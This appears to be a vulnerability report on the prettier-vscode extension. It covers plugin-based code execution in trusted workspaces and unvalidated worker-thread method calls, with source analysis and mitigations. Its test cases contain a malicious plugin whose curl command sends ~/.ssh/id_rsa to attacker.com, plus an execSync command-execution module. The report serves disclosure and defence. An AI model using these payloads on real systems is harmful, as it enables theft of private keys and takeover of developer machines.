# Vulnerabilities Report

## 1. Remote Code Execution via Malicious Prettier Plugin

### Description
The prettier-vscode extension automatically loads Prettier plugins specified in a project's configuration. When a user opens a repository in VSCode, the extension will attempt to resolve and execute plugins defined in the project's configuration files (like `.prettierrc` or `package.json`). An attacker can create a malicious repository with a custom Prettier plugin that executes arbitrary code when loaded.

### Step by step to trigger the vulnerability
1. Attacker creates a malicious repository with:
   - A `package.json` file that includes a custom Prettier plugin in its dependencies
   - A `.prettierrc` file that configures Prettier to use this malicious plugin
   - The malicious plugin contains code that will execute when it's loaded by the extension
2. Attacker convinces the victim to open this repository in VSCode
3. Victim opens the repository and trusts the workspace (VSCode's Workspace Trust feature)
4. The prettier-vscode extension loads the local version of Prettier and its plugins
5. When the extension initializes or when the victim formats a document, the malicious plugin gets loaded and executed

### Impact
The malicious code executes with the same privileges as the VSCode process, allowing it to:
- Access the victim's filesystem
- Read and exfiltrate sensitive data from the victim's machine
- Execute additional malicious commands
- Potentially attack other systems on the victim's network

### Vulnerability Rank
**Critical**

### Currently Implemented Mitigations
The extension relies on VSCode's Workspace Trust feature as the primary defense mechanism. When a workspace is not trusted, the extension disables potentially dangerous features:

```typescript
if (!workspace.isTrusted) {
  const newConfig = {
    ...config,
    prettierPath: undefined,
    configPath: undefined,
    ignorePath: ".prettierignore",
    documentSelectors: [],
    useEditorConfig: false,
    withNodeModules: false,
    resolveGlobalModules: false,
  };
  return newConfig;
}
```

Additionally, the extension attempts to validate that loaded modules are actual Prettier instances by checking for the presence of a `format` function:

```javascript
prettierInstance = require(modulePath);
if (!prettierInstance.format) {
  throw new Error("wrong instance");
}
```

### Missing Mitigations
1. No validation of plugin content or behavior before execution
2. No sandbox for executing plugins to limit their access
3. No explicit prompt to confirm loading of third-party plugins specifically
4. No allowlist approach for known safe plugins

### Preconditions
1. Victim must have the prettier-vscode extension installed
2. Victim must open the malicious repository in VSCode
3. Victim must trust the workspace when prompted by VSCode's Workspace Trust feature
4. The repository must contain valid Prettier configuration that references the malicious plugin

### Source Code Analysis
The vulnerability stems from how the extension loads and executes Prettier plugins without sufficient validation.

In `ModuleResolver.ts`, the extension resolves the configuration and plugins:

```typescript
public async resolveConfig(
  prettierInstance: {
    version: string | null;
    resolveConfigFile(filePath?: string): Promise<string | null>;
    resolveConfig(
      fileName: string,
      options?: prettier.ResolveConfigOptions,
    ): Promise<PrettierOptions | null>;
  },
  uri: Uri,
  fileName: string,
  vscodeConfig: PrettierVSCodeConfig,
): Promise<"error" | "disabled" | PrettierOptions | null> {
  // ...
  
  let resolvedConfig: PrettierOptions | null;
  try {
    resolvedConfig = isVirtual
      ? null
      : await prettierInstance.resolveConfig(fileName, resolveConfigOptions);
  } catch (error) {
    // ...
  }
  
  if (resolvedConfig) {
    resolvedConfig = resolveConfigPlugins(resolvedConfig, fileName);
  }
  
  // ...
  
  return resolvedConfig;
}
```

In `ModuleLoader.ts`, plugins are resolved and loaded:

```typescript
export function resolveConfigPlugins(
  config: PrettierOptions,
  fileName: string
): PrettierOptions {
  if (config?.plugins?.length) {
    config.plugins = config.plugins.map((plugin) => {
      if (
        typeof plugin === "string" &&
        !plugin.startsWith(".") &&
        !path.isAbsolute(plugin)
      ) {
        return resolveNodeModule(plugin, { paths: [fileName] }) || plugin;
      }
      return plugin;
    });
  }
  return config;
}
```

When a plugin is resolved, it's loaded using Node.js's require mechanism, which executes the code in the module:

```typescript
export function loadNodeModule<T>(moduleName: string): T | undefined {
  try {
    return nodeModuleLoader()(moduleName);
  } catch (error) {
    throw new Error(`Error loading node module '${moduleName}'`);
  }
}
```

In `worker/prettier-instance-worker.js`, modules are loaded and their methods are executed without sufficient validation:

```javascript
function requireInstance(modulePath) {
  let prettierInstance = path2ModuleCache.get(modulePath);
  if (!prettierInstance) {
    prettierInstance = require(modulePath);
    if (!prettierInstance.format) {
      throw new Error("wrong instance");
    }
    path2ModuleCache.set(modulePath, prettierInstance);
  }
  return prettierInstance;
}

// ...

case "callMethod": {
  const { modulePath, methodName, methodArgs } = payload;
  // ...
  let prettierInstance = path2ModuleCache.get(modulePath);
  if (!prettierInstance) {
    try {
      prettierInstance = requireInstance(modulePath);
    } catch (error) {
      postError(error);
    }
  }
  let result;
  try {
    result = prettierInstance[methodName](...methodArgs);
  } catch (error) {
    postError(error);
  }
  // ...
}
```

This code allows arbitrary method calls on loaded modules, which can be exploited if a malicious plugin is loaded.

### Security Test Case
1. Create a malicious Prettier plugin:
   ```javascript
   // malicious-prettier-plugin.js
   const exec = require('child_process').exec;
   
   module.exports = {
     parsers: {
       javascript: {
         parse: function(text) {
           // Malicious code execution
           exec('curl -d "$(cat ~/.ssh/id_rsa)" https://attacker.com/exfil');
           return { text };
         }
       }
     }
   };
   ```

2. Create a package.json that includes the malicious plugin:
   ```json
   {
     "name": "malicious-repo",
     "version": "1.0.0",
     "dependencies": {
       "prettier": "^2.8.0",
       "malicious-prettier-plugin": "file:./malicious-prettier-plugin"
     }
   }
   ```

3. Create a .prettierrc that uses the malicious plugin:
   ```json
   {
     "plugins": ["malicious-prettier-plugin"],
     "parser": "javascript"
   }
   ```

4. Add a JavaScript file to be formatted:
   ```javascript
   // victim-file.js
   function test() {    return 'test';}
   ```

5. Convince the victim to:
   - Open the repository in VSCode
   - Trust the workspace when prompted
   - Open the JavaScript file
   - Format the document (either manually or via format-on-save)

6. When the document is formatted, the malicious code in the plugin executes, exfiltrating the victim's SSH private key to the attacker's server.

## 2. Command Injection via Worker Thread Method Execution

### Description
The extension uses a worker thread to execute Prettier operations in v3. The worker thread model allows for arbitrary method execution on loaded modules through message passing between the main thread and worker thread.

### Step by step to trigger vulnerability
1. Attacker creates a malicious repository that includes a custom package with methods that perform malicious actions
2. The repository includes configuration that causes the extension to load this package
3. When the victim opens and trusts the repository, the extension loads the malicious package
4. The main thread sends a "callMethod" message to the worker thread, specifying the method to call
5. The worker executes the specified method without sufficient validation

### Impact
Execution of arbitrary code within the context of the VSCode process, potentially allowing:
- Access to the victim's filesystem
- Information theft
- Further system compromise

### Vulnerability Rank
**High**

### Currently Implemented Mitigations
VSCode's Workspace Trust feature provides some protection, as the extension limits functionality in untrusted workspaces.

### Missing Mitigations
1. No validation of what methods can be called on loaded modules
2. No sandboxing of worker thread execution
3. No allowlist of permitted methods that can be executed

### Preconditions
1. Victim must have the prettier-vscode extension installed
2. Victim must open the malicious repository in VSCode
3. Victim must trust the workspace
4. The repository must successfully trick the extension into loading a malicious module

### Source Code Analysis
In `PrettierWorkerInstance.ts`, the extension sends messages to the worker thread:

```typescript
private callMethod(methodName: string, methodArgs: unknown[]): Promise<any> {
  const callId = currentCallId++;
  const promise = new Promise((resolve, reject) => {
    this.messageResolvers.set(callId, { resolve, reject });
  });
  worker.postMessage({
    type: "callMethod",
    id: callId,
    payload: {
      modulePath: this.modulePath,
      methodName,
      methodArgs,
    },
  });
  return promise;
}
```

In the worker thread (`prettier-instance-worker.js`), these messages are processed:

```javascript
case "callMethod": {
  const { modulePath, methodName, methodArgs } = payload;
  const postError = (error) => {
    parentPort.postMessage({
      type,
      id,
      payload: { result: error, isError: true },
    });
  };
  const postResult = (result) => {
    parentPort.postMessage({
      type,
      id,
      payload: { result, isError: false },
    });
  };
  let prettierInstance = path2ModuleCache.get(modulePath);
  if (!prettierInstance) {
    try {
      prettierInstance = requireInstance(modulePath);
    } catch (error) {
      postError(error);
    }
  }
  let result;
  try {
    result = prettierInstance[methodName](...methodArgs);
  } catch (error) {
    postError(error);
  }
  // ...
}
```

The vulnerability exists because the worker executes any method on the loaded module without validation.

### Security Test Case
1. Create a malicious module with dangerous methods:
   ```javascript
   // malicious-module.js
   const { execSync } = require('child_process');
   
   module.exports = {
     format: function() {
       // Required to pass the extension's check
       return "formatted";
     },
     
     executeCommand: function(command) {
       // Malicious method that executes arbitrary commands
       return execSync(command).toString();
     }
   };
   ```

2. Create a repository that tricks the extension into loading this module
3. Modify the extension's message passing to call the malicious method (requires compromising the extension's main thread through another vulnerability)
4. When the method is called, arbitrary commands can be executed